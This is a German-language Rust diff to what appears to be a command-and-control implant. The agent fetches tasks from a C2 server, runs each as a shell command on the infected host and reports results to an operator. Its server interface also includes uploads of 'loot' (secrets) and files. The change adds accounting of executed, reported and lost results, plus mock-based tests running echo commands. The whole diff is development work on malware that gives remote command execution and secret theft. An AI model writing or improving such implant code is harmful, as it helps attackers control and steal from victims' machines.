@@ -26,24 +26,45 @@ use crate::c2::C2Port;
 /// wird gekuerzt, nicht verworfen — der Operator sieht den Anfang.
 const MAX_RESULT_LEN: usize = 8 * 1024;
 
+/// Die Bilanz der Task-Verarbeitung.
+///
+/// Drei Zahlen, drei Aussagen: wie viele Kommandos liefen, wie viele
+/// Ergebnisse den Operator erreichten, wie viele verloren gingen. Vorher
+/// wurde nur eine Zahl gezählt — die *berichteten* Ergebnisse — und im Log
+/// als „ausgeführt" beschriftet. Ein Ergebnis, das der Server nicht annahm,
+/// verschwand spurlos (Issue #69).
+#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
+pub struct TaskBilanz {
+    /// Die Kommandos, die der Agent ausgeführt hat.
+    pub ausgefuehrt: usize,
+    /// Die Ergebnisse, die der Server angenommen hat.
+    pub berichtet: usize,
+    /// Die Ergebnisse, die der Server nicht angenommen hat.
+    pub verloren: usize,
+}
+
 /// Holt die offenen Tasks dieses Hosts, fuehrt sie aus und meldet die Ergebnisse.
 ///
-/// Gibt die Anzahl der ausgefuehrten Tasks zurueck.
-pub async fn run_pending_tasks(port: &dyn C2Port, host_id: &str) -> Result<usize, TransportError> {
+/// Gibt die Bilanz zurueck: ausgefuehrt, berichtet, verloren.
+pub async fn run_pending_tasks(
+    port: &dyn C2Port,
+    host_id: &str,
+) -> Result<TaskBilanz, TransportError> {
     let tasks = port.hole_tasks()?;
     let pending: Vec<&Task> = tasks
         .iter()
         .filter(|t| t.host_id == host_id && t.status == STATUS_PENDING)
         .collect();
 
+    let mut bilanz = TaskBilanz::default();
     if pending.is_empty() {
-        return Ok(0);
+        return Ok(bilanz);
     }
     info!("{} offene Tasks gefunden", pending.len());
 
-    let mut executed = 0usize;
     for task in pending {
         let output = execute_command(&task.command).await;
+        bilanz.ausgefuehrt += 1;
         let status = if output.status == 0 {
             STATUS_DONE
         } else {
@@ -58,7 +79,7 @@ pub async fn run_pending_tasks(port: &dyn C2Port, host_id: &str) -> Result<usize
         match port.melde_task_ergebnis(&report) {
             Ok(()) => {
                 info!("Task {task_id} ausgeführt: {status}", task_id = task.id);
-                executed += 1;
+                bilanz.berichtet += 1;
             }
             Err(e) => {
                 // Ein 404 heisst: der Task existiert nicht mehr. Das ist kein
@@ -67,10 +88,11 @@ pub async fn run_pending_tasks(port: &dyn C2Port, host_id: &str) -> Result<usize
                     "Ergebnis für Task {task_id} konnte nicht gemeldet werden: {e}",
                     task_id = task.id
                 );
+                bilanz.verloren += 1;
             }
         }
     }
-    Ok(executed)
+    Ok(bilanz)
 }
 
 /// Das Ergebnis eines ausgefuehrten Kommandos.
@@ -203,6 +225,133 @@ fn truncate(text: &str, max_len: usize) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use kx_core::c2::{RegisterRequest, SecretUpload};
+    use std::sync::Mutex;
+
+    /// Ein C2-Port mit festen Tasks, der die Berichte aufzeichnet.
+    struct TaskPort {
+        tasks: Vec<Task>,
+        reports: Mutex<Vec<TaskResultRequest>>,
+        report_fehler: bool,
+    }
+
+    impl TaskPort {
+        fn neu(tasks: Vec<Task>) -> Self {
+            TaskPort {
+                tasks,
+                reports: Mutex::new(Vec::new()),
+                report_fehler: false,
+            }
+        }
+        fn mit_report_fehler(tasks: Vec<Task>) -> Self {
+            TaskPort {
+                report_fehler: true,
+                ..TaskPort::neu(tasks)
+            }
+        }
+        fn reports(&self) -> Vec<TaskResultRequest> {
+            self.reports.lock().unwrap().clone()
+        }
+    }
+
+    impl C2Port for TaskPort {
+        fn registriere_host(&self, _req: &RegisterRequest) -> Result<(), TransportError> {
+            Ok(())
+        }
+        fn melde_beute(&self, _upload: &SecretUpload) -> Result<(), TransportError> {
+            Ok(())
+        }
+        fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
+            Ok(self.tasks.clone())
+        }
+        fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError> {
+            self.reports.lock().unwrap().push(report.clone());
+            if self.report_fehler {
+                return Err(TransportError::Http("kein Ergebnis".into()));
+            }
+            Ok(())
+        }
+        fn melde_datei(&self, _upload: &kx_core::c2::FileUpload) -> Result<(), TransportError> {
+            Ok(())
+        }
+    }
+
+    fn task(id: &str, host_id: &str, command: &str, status: &str) -> Task {
+        Task {
+            id: id.into(),
+            host_id: host_id.into(),
+            command: command.into(),
+            status: status.into(),
+            result: String::new(),
+            created_at: "2026-11-25T00:00:00Z".into(),
+        }
+    }
+
+    /// Nur die eigenen, offenen Tasks laufen — fremde Hosts und erledigte
+    /// Tasks fasst der Agent nicht an (Issue #69).
+    #[tokio::test]
+    async fn nur_eigene_offene_tasks_werden_ausgefuehrt() {
+        let port = TaskPort::neu(vec![
+            task("t1", "10.0.0.5", "echo eigener", STATUS_PENDING),
+            task("t2", "10.0.0.9", "echo fremder", STATUS_PENDING),
+            task("t3", "10.0.0.5", "echo erledigt", STATUS_DONE),
+        ]);
+        let bilanz = run_pending_tasks(&port, "10.0.0.5").await.expect("Bilanz");
+        assert_eq!(bilanz.ausgefuehrt, 1);
+        assert_eq!(bilanz.berichtet, 1);
+        assert_eq!(bilanz.verloren, 0);
+        let reports = port.reports();
+        assert_eq!(reports.len(), 1);
+        assert_eq!(reports[0].task_id, "t1");
+    }
+
+    /// Ein fehlschlagender Befehl meldet den Status `failed` — der Operator
+    /// sieht den Misserfolg, nicht nur eine leere Zeile. Dieser Test war mit
+    /// einem frueheren PR weggefallen (Issue #69).
+    #[tokio::test]
+    async fn ein_fehlgeschlagener_befehl_meldet_status_failed() {
+        let port = TaskPort::neu(vec![task("t1", "10.0.0.5", "exit 3", STATUS_PENDING)]);
+        let bilanz = run_pending_tasks(&port, "10.0.0.5").await.expect("Bilanz");
+        assert_eq!(bilanz.ausgefuehrt, 1);
+        assert_eq!(bilanz.berichtet, 1);
+        let reports = port.reports();
+        assert_eq!(reports.len(), 1);
+        assert_eq!(
+            reports[0].status, STATUS_FAILED,
+            "der Misserfolg wurde nicht als failed berichtet"
+        );
+    }
+
+    /// Ein erfolgreiches Kommando meldet `done` und seine Ausgabe.
+    #[tokio::test]
+    async fn ein_erfolgreiches_kommando_meldet_done_und_ausgabe() {
+        let port = TaskPort::neu(vec![task(
+            "t1",
+            "10.0.0.5",
+            "echo kx-bilanz-test",
+            STATUS_PENDING,
+        )]);
+        let bilanz = run_pending_tasks(&port, "10.0.0.5").await.expect("Bilanz");
+        assert_eq!(bilanz.ausgefuehrt, 1);
+        assert_eq!(bilanz.berichtet, 1);
+        let reports = port.reports();
+        assert_eq!(reports[0].status, STATUS_DONE);
+        assert!(reports[0].result.contains("kx-bilanz-test"));
+    }
+
+    /// Ein Ergebnis, das der Server nicht annimmt, zaehlt als verloren —
+    /// es verschwindet nicht mehr spurlos (Issue #69).
+    #[tokio::test]
+    async fn ein_nicht_berichtetes_ergebnis_zaehlt_als_verloren() {
+        let port = TaskPort::mit_report_fehler(vec![
+            task("t1", "10.0.0.5", "echo eins", STATUS_PENDING),
+            task("t2", "10.0.0.5", "echo zwei", STATUS_PENDING),
+        ]);
+        let bilanz = run_pending_tasks(&port, "10.0.0.5").await.expect("Bilanz");
+        assert_eq!(bilanz.ausgefuehrt, 2, "ausgefuehrt wurde trotzdem");
+        assert_eq!(bilanz.berichtet, 0);
+        assert_eq!(bilanz.verloren, 2);
+    }
 
     /// Der Agent fuehrt wirklich etwas aus — der Pfad ist nicht nur eine
     /// Formalitaet. Ohne diesen Test koennte die Shell-Anbindung stillschweigend
